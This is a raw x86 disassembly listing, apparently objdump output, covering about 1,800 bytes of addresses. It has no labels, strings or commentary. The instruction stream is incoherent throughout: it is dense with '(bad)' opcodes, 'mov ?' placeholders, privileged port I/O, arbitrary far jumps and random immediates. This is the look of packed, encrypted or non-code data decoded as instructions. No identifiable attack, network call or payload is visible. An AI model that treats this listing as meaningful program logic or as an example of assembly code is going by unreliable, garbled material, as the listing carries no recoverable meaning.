  4028bf:	mov    ch,0x9b
  4028c1:	push   cs
  4028c2:	dec    esi
  4028c3:	call   0xa602:0x94bf015
  4028ca:	fxam   
  4028cc:	call   DWORD PTR [ebp+0x4d]
  4028cf:	dec    esp
  4028d0:	mov    edx,0x75e1837f
  4028d5:	sub    eax,0x80b6d6a3
  4028da:	xchg   ebp,eax
  4028db:	jecxz  0x4028f4
  4028dd:	sub    dl,BYTE PTR [edi+0x76]
  4028e0:	imul   ebp,DWORD PTR [ebp+0x61],0xffffff88
  4028e4:	inc    edx
  4028e5:	gs inc edx
  4028e7:	or     ecx,ebx
  4028e9:	mov    DWORD PTR [esi+eax*8],esp
  4028ec:	cmp    esi,esp
  4028ee:	mov    ch,0xf6
  4028f0:	pop    ss
  4028f1:	leave  
  4028f2:	(bad)  
  4028f3:	je     0x402906
  4028f5:	push   0x7c
  4028f7:	adc    al,0xe9
  4028f9:	in     al,0xb4
  4028fb:	push   cs
  4028fc:	fst    DWORD PTR [esi+0x73]
  4028ff:	mov    ?,WORD PTR [edx]
  402901:	push   0xffffff89
  402903:	imul   esp,ecx,0x3c
  402906:	nop
  402907:	and    al,0xce
  402909:	cmp    BYTE PTR [edx],bl
  40290b:	or     eax,0x8d70564
  402910:	push   cs
  402911:	rcr    DWORD PTR [ebx-0xb7930f],0x23
  402918:	mov    eax,0xfd70b660
  40291d:	fidiv  DWORD PTR [ecx+0x4bd63232]
  402923:	ss je  0x40290f
  402926:	push   edx
  402927:	pop    esp
  402928:	inc    esp
  402929:	dec    edx
  40292a:	or     al,0x60
  40292c:	shl    DWORD PTR [edx-0x19],1
  40292f:	enter  0x4050,0x9f
  402933:	call   DWORD PTR [ecx]
  402935:	adc    DWORD PTR [ebx-0x49],eax
  402938:	arpl   WORD PTR [edx],bx
  40293a:	out    0xcf,eax
  40293c:	inc    ecx
  40293d:	xlat   BYTE PTR ds:[ebx]
  40293e:	in     eax,dx
  40293f:	pop    esp
  402940:	pusha  
  402941:	(bad)  
  402942:	and    eax,0xd4ab62f2
  402947:	ret    0x6fb
  40294a:	nop
  40294b:	push   ss
  40294c:	enter  0x5575,0x7c
  402950:	adc    DWORD PTR [eax-0x72],edx
  402953:	mov    bh,0xe6
  402955:	pop    ss
  402956:	xchg   ebx,eax
  402957:	je     0x402923
  402959:	mov    ds:0xb1e7c18e,eax
  40295e:	inc    edx
  40295f:	dec    ecx
  402960:	xchg   edi,eax
  402961:	or     eax,0x7490a18d
  402966:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402967:	repz and DWORD PTR ds:0xdbba283a,esp
  40296e:	sahf   
  40296f:	sub    DWORD PTR [eax],ebx
  402971:	sbb    eax,0xc051e6dd
  402976:	iret   
  402977:	sub    edi,DWORD PTR [eax+edx*8-0x1addf760]
  40297e:	jns    0x40298d
  402980:	aas    
  402981:	xchg   ecx,eax
  402982:	hlt    
  402983:	mov    ds:0x83f2c3b4,eax
  402988:	sbb    DWORD PTR [esi+0x49380f4d],edi
  40298e:	cmp    BYTE PTR [eax+0x3db444cb],bl
  402994:	stc    
  402995:	xadd   BYTE PTR [ebp+0x9],bh
  402999:	jb     0x402998
  40299b:	push   esi
  40299c:	imul   ebp,edx,0x4c
  40299f:	bound  edx,QWORD PTR [ebx-0x16]
  4029a2:	add    eax,0xa759b05e
  4029a7:	sahf   
  4029a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4029a9:	and    eax,0x19
  4029ac:	sbb    eax,0x3e0bea5d
  4029b1:	retf   0xdbc3
  4029b4:	dec    ebp
  4029b5:	aas    
  4029b6:	xlat   BYTE PTR ds:[ebx]
  4029b7:	shr    DWORD PTR [ebx+0x5e7c9354],cl
  4029bd:	cmc    
  4029be:	push   ecx
  4029bf:	mov    ebx,0xad4c2757
  4029c4:	(bad)  
  4029c5:	scas   al,BYTE PTR es:[edi]
  4029c6:	call   0xe87d:0xc427f3fb
  4029cd:	nop
  4029ce:	cmp    edx,eax
  4029d0:	sub    eax,0x91fa0610
  4029d5:	sbb    BYTE PTR ds:0xcffbbb2d,bl
  4029db:	int3   
  4029dc:	cmc    
  4029dd:	arpl   WORD PTR [eax],cx
  4029df:	xchg   ebp,eax
  4029e0:	jno    0x4029eb
  4029e2:	popa   
  4029e3:	mov    esi,DWORD PTR [ebp+eax*2-0x5]
  4029e7:	dec    ebp
  4029e8:	jbe    0x40298b
  4029ea:	adc    al,0x6c
  4029ec:	pop    esp
  4029ed:	int    0xac
  4029ef:	add    eax,0x9488afbe
  4029f4:	mov    eax,DWORD PTR [eax]
  4029f6:	jnp    0x4029dc
  4029f8:	icebp  
  4029f9:	inc    eax
  4029fa:	push   cs
  4029fb:	loopne 0x402a22
  4029fd:	and    edi,esp
  4029ff:	jg     0x4029ed
  402a01:	dec    ebx
  402a02:	jl     0x402a1f
  402a04:	icebp  
  402a05:	sar    DWORD PTR [eax+0x77],0x2e
  402a09:	in     al,dx
  402a0a:	sub    ebx,DWORD PTR ds:0x9524dc3a
  402a10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402a11:	js     0x402a04
  402a13:	mov    edx,0x817163e5
  402a18:	mov    ch,0x36
  402a1a:	xor    al,0x71
  402a1c:	(bad)  
  402a1d:	icebp  
  402a1e:	cmp    cl,BYTE PTR [eax+0x28]
  402a21:	xchg   ecx,eax
  402a22:	aad    0xff
  402a24:	jne    0x4029c5
  402a26:	retf   
  402a27:	shl    BYTE PTR [ebp+0x6f],0x63
  402a2b:	add    ch,BYTE PTR [edx]
  402a2d:	push   eax
  402a2e:	inc    ecx
  402a2f:	div    BYTE PTR [edx-0x5577166a]
  402a35:	xor    ebp,DWORD PTR [esp+esi*8-0x62]
  402a39:	aam    0x7f
  402a3b:	pop    ecx
  402a3c:	dec    edx
  402a3d:	test   DWORD PTR [ecx-0x7ba88596],ecx
  402a43:	fidiv  WORD PTR [ebx+0x7c]
  402a46:	fist   WORD PTR [ecx+eax*8-0xd3f9596]
  402a4d:	dec    eax
  402a4e:	test   al,0x62
  402a50:	iret   
  402a51:	ins    DWORD PTR es:[edi],dx
  402a52:	xchg   edx,ebp
  402a54:	outs   dx,BYTE PTR ds:[esi]
  402a55:	(bad)  
  402a57:	dec    edi
  402a58:	retf   0xe985
  402a5b:	adc    eax,DWORD PTR [eax+edx*1]
  402a5e:	loop   0x402a17
  402a60:	inc    ebx
  402a61:	inc    ebx
  402a62:	or     eax,0xacfd8aec
  402a67:	push   esi
  402a68:	pop    edx
  402a69:	dec    ebp
  402a6a:	imul   BYTE PTR [ebp-0x2e4fd36]
  402a70:	(bad)  
  402a72:	ins    BYTE PTR es:[edi],dx
  402a73:	and    esp,edx
  402a75:	xor    esi,ebx
  402a77:	ret    0xe367
  402a7a:	jne    0x402a0b
  402a7c:	adc    DWORD PTR [eax],esi
  402a7e:	and    al,0x96
  402a80:	sbb    DWORD PTR [ebx+ebp*2+0x48],edi
  402a84:	les    ecx,FWORD PTR [edx-0x4cbd0f2a]
  402a8a:	(bad)
  402a8f:	daa    
  402a90:	bnd jo 0x402a4e
  402a93:	les    edi,FWORD PTR [ecx]
  402a95:	mov    dh,0xfc
  402a97:	test   al,0xcf
  402a99:	data16 xchg ch,bh
  402a9c:	mov    al,ds:0x5e20c57d
  402aa1:	dec    esi
  402aa2:	pop    esp
  402aa3:	ss popf 
  402aa5:	out    dx,al
  402aa6:	outs   dx,DWORD PTR ds:[esi]
  402aa7:	out    0xd0,al
  402aa9:	mov    esp,0x90278f0d
  402aae:	fwait
  402aaf:	cmp    eax,0xbef153b3
  402ab4:	outs   dx,DWORD PTR ds:[esi]
  402ab5:	push   cs
  402ab6:	or     BYTE PTR [edx+0x67],bl
  402ab9:	push   eax
  402aba:	in     eax,0x1b
  402abc:	(bad)  [ecx]
  402abe:	xor    BYTE PTR [edi],bl
  402ac0:	ds ret 
  402ac2:	mov    ?,WORD PTR [edi-0x56]
  402ac5:	or     eax,0x39e23be1
  402aca:	cmp    ch,BYTE PTR [edx+0x669074cd]
  402ad0:	xchg   ebx,eax
  402ad1:	pop    ecx
  402ad2:	retf   0xc56d
  402ad5:	(bad)  [edx-0x32]
  402ad8:	clc    
  402ad9:	push   ecx
  402ada:	fisubr DWORD PTR [eax-0x55]
  402add:	sub    al,0x37
  402adf:	adc    edi,edi
  402ae1:	push   edi
  402ae2:	jmp    0xfa55:0x5a13854c
  402ae9:	or     BYTE PTR [eax-0x69c9cee7],ch
  402aef:	mov    ds:0x9ccbf459,al
  402af4:	popa   
  402af5:	mov    ecx,0xe0e83291
  402afa:	mov    DWORD PTR [edx+0x11],eax
  402afd:	fstp   TBYTE PTR [edi]
  402aff:	bound  ebp,QWORD PTR fs:[eax-0x1a58725d]
  402b06:	gs mov esi,0x461b3a02
  402b0c:	sub    dl,cl
  402b0e:	mov    BYTE PTR [esi-0x5f137369],al
  402b14:	sbb    al,0xe3
  402b16:	inc    ebx
  402b17:	idiv   BYTE PTR [ebx+0x66231471]
  402b1d:	cmp    eax,0x1c93ff0a
  402b22:	lods   eax,DWORD PTR ds:[esi]
  402b23:	enter  0x1e1a,0xa3
  402b27:	push   edx
  402b28:	sahf   
  402b29:	mov    ecx,0x69f0b806
  402b2e:	or     cl,bl
  402b30:	mov    edi,0x5e383197
  402b35:	sbb    DWORD PTR [edi-0x68bd618c],ecx
  402b3b:	mov    al,ds:0x9610c6f3
  402b40:	bound  ebp,QWORD PTR [esi]
  402b42:	in     al,0x39
  402b44:	icebp  
  402b45:	xor    esi,DWORD PTR [eax-0x44]
  402b48:	mov    esp,0xad21d162
  402b4d:	add    eax,0x2c1df040
  402b52:	ins    BYTE PTR es:[edi],dx
  402b53:	pop    eax
  402b54:	ret    0xa307
  402b57:	adc    edi,ecx
  402b59:	pusha  
  402b5a:	call   ebp
  402b5c:	es (bad) 
  402b5f:	inc    ebx
  402b60:	inc    eax
  402b61:	popf   
  402b62:	std    
  402b63:	dec    esi
  402b64:	xchg   esi,eax
  402b65:	mov    bh,0x92
  402b67:	(bad)  
  402b68:	std    
  402b69:	dec    esi
  402b6a:	int    0x9e
  402b6c:	hlt    
  402b6d:	inc    esp
  402b6e:	push   es
  402b6f:	adc    edi,DWORD PTR [esi+0x43]
  402b72:	mov    eax,0xa971c653
  402b77:	xor    BYTE PTR [edi],bl
  402b79:	int    0xcb
  402b7b:	addr16 je 0x402bb6
  402b7e:	int3   
  402b7f:	xchg   ebp,eax
  402b80:	enter  0xae37,0xe5
  402b84:	dec    ebx
  402b85:	in     al,dx
  402b86:	mov    bl,0x53
  402b88:	inc    edi
  402b89:	popf   
  402b8a:	jl     0x402b0f
  402b8c:	fs pop eax
  402b8e:	mov    edi,0xc1393ecc
  402b93:	pop    edi
  402b94:	fs adc ebp,edi
  402b97:	bound  edi,QWORD PTR [edx+0x1aac61ce]
  402b9d:	mov    esp,0x336f2eb
  402ba2:	xchg   BYTE PTR [ecx-0x39c23f16],ch
  402ba8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402ba9:	add    al,0xf9
  402bab:	pcmpgtd mm6,QWORD PTR [edx+0x37aa78ae]
  402bb2:	mov    bl,bl
  402bb4:	adc    ecx,esi
  402bb6:	lahf   
  402bb7:	mov    cl,BYTE PTR [esi-0x51]
  402bba:	retf   0x33de
  402bbd:	push   ds
  402bbe:	xor    BYTE PTR [ebx+0x1c],ah
  402bc1:	rcl    al,1
  402bc3:	adc    dh,dh
  402bc5:	jmp    0x10cc:0xb021f25
  402bcc:	pop    ss
  402bcd:	daa    
  402bce:	jne    0x402c14
  402bd0:	push   eax
  402bd1:	stc    
  402bd2:	or     ebx,DWORD PTR [ebp+0x6700fecc]
  402bd8:	sbb    ebp,ebp
  402bda:	or     ch,ah
  402bdc:	in     eax,dx
  402bdd:	mov    ecx,0x7ecc9b75
  402be2:	mov    ebx,0x591b5340
  402be7:	lahf   
  402be8:	push   edi
  402be9:	add    ah,BYTE PTR [edx-0x38]
  402bec:	add    DWORD PTR [edx],0xffffffd2
  402bef:	inc    eax
  402bf0:	and    eax,0x1f64ef78
  402bf5:	(bad)  
  402bf6:	mov    BYTE PTR [ebp-0x73],al
  402bf9:	add    eax,0x6b2f46f0
  402bfe:	scas   al,BYTE PTR es:[edi]
  402bff:	daa    
  402c00:	fwait
  402c01:	xlat   BYTE PTR ds:[ebx]
  402c02:	mov    dh,0xa
  402c04:	mov    ecx,DWORD PTR [edi+0x5c06ed05]
  402c0a:	test   cl,ch
  402c0c:	dec    ebp
  402c0d:	push   ebp
  402c0e:	loopne 0x402c81
  402c10:	and    BYTE PTR [edx-0x5a],bl
  402c13:	(bad)  
  402c16:	mov    edi,0x9814a316
  402c1b:	xlat   BYTE PTR ds:[ebx]
  402c1c:	shl    BYTE PTR [ebp-0x5c828123],cl
  402c22:	scas   al,BYTE PTR es:[edi]
  402c23:	xchg   BYTE PTR [ebp+0x4a],bh
  402c26:	fld    TBYTE PTR [ecx-0x5ba101c7]
  402c2c:	push   ds
  402c2d:	sbb    BYTE PTR [ecx+0x24],cl
  402c30:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402c31:	sbb    BYTE PTR [eax-0x79],ah
  402c34:	sub    al,0x3e
  402c36:	imul   ecx,ebp,0x20f06f09
  402c3c:	inc    ebx
  402c3d:	adc    al,0x44
  402c3f:	dec    ebp
  402c40:	into   
  402c41:	push   ds
  402c42:	add    ecx,esp
  402c44:	int    0x2b
  402c46:	xchg   DWORD PTR [esi-0x50],esi
  402c49:	aaa    
  402c4a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402c4b:	mov    edi,0xa4bfb76b
  402c50:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402c51:	mov    ds:0x1d50eeec,eax
  402c56:	add    edx,eax
  402c58:	push   ebx
  402c59:	dec    ebp
  402c5a:	lock mov dh,0xf4
  402c5d:	int3   
  402c5e:	xlat   BYTE PTR ds:[ebx]
  402c5f:	mov    eax,ds:0xfc09aa3f
  402c64:	jge    0x402bfc
  402c66:	test   eax,0x82c6a868
  402c6b:	dec    ebp
  402c6c:	or     DWORD PTR [ecx],ebp
  402c6e:	and    edx,esi
  402c70:	xchg   ebx,eax
  402c71:	ss clc 
  402c73:	add    DWORD PTR ds:0xdedb28dd,ecx
  402c79:	dec    ecx
  402c7a:	(bad)
  402c80:	pop    edx
  402c81:	inc    edx
  402c82:	cmp    ecx,esp
  402c84:	shl    BYTE PTR ds:0x402a6193,cl
  402c8a:	and    bh,BYTE PTR [edi-0x5d6efaa8]
  402c90:	xor    BYTE PTR [esi],0x5e
  402c93:	inc    edi
  402c94:	xchg   esi,eax
  402c95:	in     eax,dx
  402c96:	int3   
  402c97:	cli    
  402c98:	pop    es
  402c99:	(bad)  
  402c9a:	fadd   QWORD PTR [eax]
  402c9c:	push   ebp
  402c9d:	js     0x402ce7
  402c9f:	mov    edi,0xf05f1af0
  402ca4:	sub    eax,0xfea92646
  402ca9:	ret    
  402caa:	pop    edx
  402cab:	sahf   
  402cac:	mov    ebx,0x89d9690d
  402cb1:	xchg   ebx,eax
  402cb2:	xor    al,BYTE PTR [edi+0x68]
  402cb5:	xor    BYTE PTR ds:0xd6f55cff,bl
  402cbb:	jae    0x402cfa
  402cbd:	test   BYTE PTR [ebx],dl
  402cbf:	push   esp
  402cc0:	stos   BYTE PTR es:[edi],al
  402cc1:	call   0x4c49fce2
  402cc6:	int    0x3a
  402cc8:	ja     0x402cbd
  402cca:	cmp    eax,0xb120d8fc
  402ccf:	xor    al,0x21
  402cd1:	cli    
  402cd2:	ficomp WORD PTR [edx]
  402cd4:	outs   dx,DWORD PTR ds:[esi]
  402cd5:	xlat   BYTE PTR ds:[ebx]
  402cd6:	jg     0x402cdc
  402cd8:	imul   edx,edi,0x4c1a9117
  402cde:	push   ds
  402cdf:	pop    esi
  402ce0:	idiv   BYTE PTR [edx+0x7f9988aa]
  402ce6:	cdq    
  402ce7:	xor    ebp,DWORD PTR [esi-0x753f1fa2]
  402ced:	xor    al,0x42
  402cef:	mov    ds:0x69bef7a1,eax
  402cf4:	adc    eax,0x802b5693
  402cf9:	ret    
  402cfa:	test   BYTE PTR [eax+0x1],bh
  402cfd:	add    al,BYTE PTR [ecx+edx*4-0x8]
  402d01:	inc    eax
  402d02:	add    edx,ebp
  402d04:	adc    ecx,DWORD PTR [edi]
  402d06:	pusha  
  402d07:	and    DWORD PTR [edx*2+0xfc15557],ebx
  402d0e:	cmp    eax,0x73ba8e42
  402d13:	xor    eax,0xc5ab143b
  402d18:	cmp    DWORD PTR [esi],0xffffffd0
  402d1b:	jns    0x402caf
  402d1d:	jp     0x402d7e
  402d1f:	add    dl,BYTE PTR [edi+0x31b36838]
  402d25:	push   edi
  402d26:	rol    DWORD PTR [ebp+0x5b],cl
  402d29:	pop    ecx
  402d2a:	rcr    DWORD PTR [ecx],0x53
  402d2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402d2e:	dec    edi
  402d2f:	mov    cl,0x56
  402d31:	fimul  WORD PTR [eax]
  402d33:	les    edx,FWORD PTR [ebp+0x154ad6da]
  402d39:	mov    WORD PTR [ebx+eiz*8],?
  402d3c:	repz shr esp,cl
  402d3f:	call   0x4b14db74
  402d44:	mov    ah,0x1f
  402d46:	add    al,0x1c
  402d48:	scas   eax,DWORD PTR es:[edi]
  402d49:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402d4a:	mov    al,0x2e
  402d4c:	jmp    0x2bc4:0xfda3043d
  402d53:	mov    al,0x29
  402d55:	rol    DWORD PTR [eax],cl
  402d57:	fcom   DWORD PTR [edi-0x67]
  402d5a:	int3   
  402d5b:	test   al,0x8a
  402d5d:	shl    edx,0xe1
  402d60:	popa   
  402d61:	lods   eax,DWORD PTR ds:[esi]
  402d62:	rol    DWORD PTR [ecx],cl
  402d64:	sbb    DWORD PTR [eax+0x2fe06d62],esp
  402d6a:	and    eax,0xebfdd59a
  402d6f:	stos   BYTE PTR es:[edi],al
  402d70:	shl    BYTE PTR [eax],cl
  402d72:	popa   
  402d73:	leave  
  402d74:	add    ebp,DWORD PTR [ecx+0x3d]
  402d77:	xor    cl,dl
  402d79:	test   DWORD PTR [ecx-0x24],ebp
  402d7c:	jo     0x402d66
  402d7e:	push   ebx
  402d7f:	and    esp,esp
  402d81:	jne    0x402de7
  402d83:	retf   
  402d84:	call   0x5bf8:0xd5ca334e
  402d8b:	test   al,0x62
  402d8d:	mov    ds:0xacd44b2a,al
  402d92:	pop    ss
  402d93:	clc    
  402d94:	pop    edi
  402d95:	je     0x402d1d
  402d97:	cmp    ah,BYTE PTR [eax-0x21]
  402d9a:	pop    esi
  402d9b:	leave  
  402d9c:	mov    ch,0x9c
  402d9e:	rol    DWORD PTR [eax-0x5b],cl
  402da1:	jb     0x402ddb
  402da3:	xchg   esi,eax
  402da4:	adc    DWORD PTR [ebx-0x133741d3],ecx
  402daa:	xchg   ecx,eax
  402dab:	xchg   esi,eax
  402dac:	pop    ds
  402dad:	cmp    DWORD PTR [edi],esp
  402daf:	out    dx,eax
  402db0:	push   0xb0f44b60
  402db5:	sub    DWORD PTR [ebp-0x19ce1690],ebx
  402dbb:	adc    eax,DWORD PTR [ecx-0x13]
  402dbe:	mov    edx,0x2d313c2d
  402dc3:	sahf   
  402dc4:	mov    dh,0x87
  402dc6:	pop    es
  402dc7:	xchg   BYTE PTR es:[eax-0x63df20c7],al
  402dce:	dec    ecx
  402dcf:	call   DWORD PTR [si]
  402dd2:	test   BYTE PTR [edi+0x21ddf517],0x20
  402dd9:	push   esp
  402dda:	mov    al,0xe6
  402ddc:	xchg   ecx,eax
  402ddd:	xor    eax,0x4c137425
  402de2:	iret   
  402de3:	push   esp
  402de4:	jmp    0x402de9
  402de6:	mov    dl,0x59
  402de8:	adc    eax,0x28975add
  402ded:	cmp    esp,edi
  402def:	inc    eax
  402df0:	pop    ss
  402df1:	bound  ecx,QWORD PTR [ebp+ecx*8-0x32]
  402df5:	inc    DWORD PTR [eax+0x32]
  402df8:	ret    
  402df9:	jg     0x402e08
  402dfb:	int3   
  402dfc:	call   0x4bdb:0x38cb7a8b
  402e03:	sbb    eax,0x81820f9a
  402e08:	adc    al,0x70
  402e0a:	xchg   ebx,eax
  402e0b:	out    dx,al
  402e0c:	add    DWORD PTR [edi+0x3e],esp
  402e0f:	je     0x402e56
  402e11:	mov    ebx,0x704f430
  402e16:	and    al,0x66
  402e18:	in     al,0x27
  402e1a:	test   DWORD PTR [ecx],ebx
  402e1c:	adc    ch,0x38
  402e1f:	fistp  DWORD PTR [esi-0x7f]
  402e22:	inc    eax
  402e23:	pushfw 
  402e25:	cmovae ebx,DWORD PTR [ecx-0x45]
  402e29:	shr    DWORD PTR [esi+edi*8-0x12],cl
  402e2d:	ficom  DWORD PTR [eax]
  402e2f:	int    0xe2
  402e31:	sub    DWORD PTR [eax],ebx
  402e33:	sbb    DWORD PTR [ebp-0x78147272],edx
  402e39:	cs jmp 0x402ea4
  402e3c:	in     eax,0xdb
  402e3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402e3f:	mov    es,WORD PTR ds:0x90727315
  402e45:	fdivr  st(7),st
  402e47:	cmp    DWORD PTR [ecx],esp
  402e49:	sub    ebx,edi
  402e4b:	jmp    FWORD PTR [eax]
  402e4d:	mov    dl,0x3a
  402e4f:	scas   eax,DWORD PTR es:[edi]
  402e50:	in     eax,0x72
  402e52:	pushf  
  402e53:	mov    ebx,esp
  402e55:	iret   
  402e56:	lock fdivr DWORD PTR [edx+0x3b53e30e]
  402e5d:	push   edi
  402e5e:	(bad)  
  402e5f:	cmp    ah,BYTE PTR [ecx+0x2]
  402e62:	jns    0x402e41
  402e64:	xchg   esi,eax
  402e65:	clc    
  402e66:	aam    0x87
  402e68:	rcl    DWORD PTR [ebx],1
  402e6a:	xchg   eax,edi
  402e6c:	shr    al,0xca
  402e6f:	repnz sub ax,0xa12c
  402e74:	aam    0xf2
  402e76:	mov    DWORD PTR [ecx-0x15678f0],ecx
  402e7c:	out    dx,al
  402e7d:	loop   0x402e64
  402e7f:	jno    0x402e69
  402e81:	add    eax,0x2b6e5555
  402e86:	sbb    DWORD PTR [edx-0x2e],esp
  402e89:	sahf   
  402e8a:	cmp    BYTE PTR ds:0xbb96a08d,ch
  402e90:	into   
  402e91:	loop   0x402e94
  402e93:	jno    0x402e26
  402e95:	sahf   
  402e96:	hlt    
  402e97:	and    al,BYTE PTR [edi+0x22]
  402e9a:	sub    ch,al
  402e9c:	sub    al,0xe3
  402e9e:	dec    DWORD PTR [edi+0x641f1405]
  402ea4:	mov    edi,0x9593ff96
  402ea9:	aam    0xe2
  402eab:	retf   0xb91a
  402eae:	sbb    al,0x98
  402eb0:	xrelease xchg BYTE PTR [eax+edi*1-0x41],dl
  402eb5:	pop    es
  402eb6:	ror    DWORD PTR [esi+0x36fc672d],cl
  402ebc:	out    dx,eax
  402ebd:	inc    ebx
  402ebe:	lock popf 
  402ec0:	add    esi,DWORD PTR [eax-0x740b9615]
  402ec6:	out    0xef,al
  402ec8:	pop    ebp
  402ec9:	lahf   
  402eca:	lea    ecx,[edx-0x69]
  402ecd:	scas   al,BYTE PTR es:[edi]
  402ece:	bound  edi,QWORD PTR [ebp-0x36004119]
  402ed4:	ja     0x402e86
  402ed6:	jo     0x402f40
  402ed8:	out    dx,eax
  402ed9:	fwait
  402eda:	shr    DWORD PTR [edx+edx*4+0x414cc827],0x8b
  402ee2:	adc    WORD PTR [ecx],dx
  402ee5:	or     BYTE PTR [ebx+ebx*4-0x2f8b85ac],bh
  402eec:	sub    BYTE PTR [ecx],0x97
  402eef:	adc    cl,0xf2
  402ef2:	leave  
  402ef3:	leave  
  402ef4:	icebp  
  402ef5:	aaa    
  402ef6:	sub    ebp,DWORD PTR [edx*8-0x2d904928]
  402efd:	or     eax,0x41c1c89
  402f02:	inc    ecx
  402f03:	es mov bl,0x8d
  402f06:	adc    edi,DWORD PTR [ebx]
  402f08:	cmp    ebx,edi
  402f0a:	jp     0x402ea4
  402f0c:	rcr    BYTE PTR [ebx-0x65],cl
  402f0f:	dec    ebp
  402f10:	jae    0x402f58
  402f12:	mov    ch,0x7d
  402f14:	mov    eax,ds:0x168e5221
  402f19:	std    
  402f1a:	mov    edx,0xa1a25650
  402f1f:	xchg   edx,eax
  402f20:	sub    al,0x98
  402f22:	mov    DWORD PTR [eax+0x7f8316ad],edx
  402f28:	mov    eax,ds:0xc6ecf000
  402f2d:	cmp    DWORD PTR [edi-0x14],ecx
  402f30:	loop   0x402eff
  402f32:	xlat   BYTE PTR ds:[ebx]
  402f33:	gs sahf 
  402f35:	push   es
  402f36:	and    BYTE PTR [ebp+0x4f79fb53],al
  402f3c:	jo     0x402f62
  402f3e:	mov    cl,0xf
  402f40:	push   eax
  402f41:	push   ss
  402f42:	ret    0x697c
  402f45:	and    eax,0x7f5cae68
  402f4a:	pushf  
  402f4b:	jmp    0x51d3:0xb1bb6a02
  402f52:	push   ebp
  402f53:	add    eax,0x93cd6b9
  402f58:	sar    edi,1
  402f5a:	add    eax,DWORD PTR [ecx+0x3]
  402f5d:	bound  ebp,QWORD PTR [ecx+0x7cb19cab]
  402f63:	sbb    DWORD PTR [edx],0xfffffff3
  402f66:	sub    esi,ebx
  402f68:	nop
  402f69:	xchg   DWORD PTR [eax],ebx
  402f6b:	js     0x402f54
  402f6d:	jp     0x402f0d
  402f6f:	int    0xc6
  402f71:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402f72:	push   ds
  402f73:	loopne 0x402ef9
  402f75:	cmc    
  402f76:	xchg   esp,eax
  402f77:	int    0xcb
  402f79:	xor    BYTE PTR [edx+0x7d],0x4c
  402f7d:	mov    ah,0x7b
  402f7f:	out    0x39,al
  402f81:	jbe    0x402f52
  402f83:	jmp    0x504c9c26
  402f88:	dec    ecx
  402f89:	or     eax,0x3078a6d8
  402f8e:	inc    esi
  402f8f:	jae    0x402f6b
  402f91:	add    DWORD PTR [ecx+0xbe9ddc9],ebx
  402f97:	aam    0x9d
  402f99:	jae    0x402feb
  402f9b:	leave  
  402f9c:	jecxz  0x402fe7
  402f9e:	aad    0xec
  402fa0:	pop    ebx
  402fa1:	in     eax,dx
  402fa2:	adc    al,0xa
  402fa4:	enter  0xe1a5,0x95
  402fa8:	or     ecx,DWORD PTR [eax+edx*1+0x3ed7178b]
  402faf:	add    al,0x64
  402fb1:	imul   edx,DWORD PTR [edi-0x41dedf7a],0x3ced89a3
  402fbb:	and    edi,DWORD PTR [esi+0x31]
  402fbe:	fnstcw WORD PTR ds:0xb48e9fd6
  402fc4:	xchg   esi,eax
  402fc5:	cli    
  402fc6:	xor    BYTE PTR [edx-0x14],bl
  402fc9:	push   ecx
  402fca:	mov    dl,cl
  402fcc:	std    
  402fcd:	mov    esp,DWORD PTR [edi-0x54]
  402fd0:	mov    ch,0x30
  402fd2:	dec    esp
  402fd3:	mov    esi,ebp
  402fd5:	mov    ds:0xa62463ee,al
  402fda:	xchg   esi,eax
  402fdb:	push   esp
  402fdc:	push   0x51
  402fde:	jae    0x403036
  402fe0:	xchg   BYTE PTR [ebx-0x2ff8c4d],al
  402fe6:	outs   dx,BYTE PTR ds:[esi]
  402fe7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402fe8:	mov    eax,ds:0x3a21642e
  402fed:	dec    ebp
  402fee:	pop    eax
  402fef:	inc    ebp
  402ff0:	mov    esi,0x3e2417c0
  402ff5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402ff6:	mov    cl,BYTE PTR [ecx+0x57]
  402ff9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402ffa:	or     al,0x54
  402ffc:	xchg   DWORD PTR [esi-0x5a],eax
  402fff:	cmp    eax,0xadfa8174
  403004:	in     eax,0x4e
  403006:	test   DWORD PTR [bx+di+0x52],ecx
  40300a:	mov    ebp,DWORD PTR [edi+0x6d]
  40300d:	mov    bl,0xd8
  40300f:	push   ss
  403010:	imul   edi,DWORD PTR [ebx+0x7c6fb9a7],0x2e3c7621
  40301a:	push   edi
  40301b:	test   eax,0x80837a40
  403020:	add    BYTE PTR [eax],0x82
  403023:	or     bl,cl
  403025:	in     al,dx
  403026:	or     eax,0x1bea0b31
  40302b:	mov    WORD PTR [edx-0x6bf1dbfc],?
  403031:	dec    ecx
  403032:	repnz push edi
  403034:	push   0xfffffff8
  403036:	xchg   edx,eax
  403037:	arpl   WORD PTR [ebx],cx
  403039:	inc    ecx
  40303a:	(bad)  
  40303c:	test   al,0x4b
  40303e:	imul   esp,ecx,0xd
  403041:	test   DWORD PTR [edi+ebp*2],ecx
  403044:	mov    dh,0xc9
  403046:	adc    BYTE PTR [ecx+0x41],dh
  403049:	push   0x524e0a3a
  40304e:	ins    DWORD PTR es:[edi],dx
  40304f:	outs   dx,BYTE PTR ds:[esi]
  403050:	push   cs
  403051:	sub    BYTE PTR [edx],ch
  403053:	cmp    ah,bl
  403055:	adc    cl,0xb6
  403058:	shl    DWORD PTR [esi+0x7c],1
  40305b:	call   0xb11dca7e
  403060:	jo     0x403057
  403062:	fwait
  403063:	into   
  403064:	jns    0x40300a
  403066:	out    0x75,eax
  403068:	adc    BYTE PTR [esi-0x3c7b1424],bl
  40306e:	lahf   
  40306f:	dec    edx
  403070:	or     DWORD PTR [eax-0x40],0xfffffff4
  403074:	(bad)  
  403075:	pop    eax
  403076:	int3   
  403077:	fcomp  DWORD PTR [eax-0x41]
  40307a:	js     0x4030c3
  40307c:	sbb    eax,0x9432a7b9
  403081:	(bad)  
  403082:	daa    
  403083:	push   0xfffffff8
  403085:	jg     0x403023
  403087:	out    dx,eax
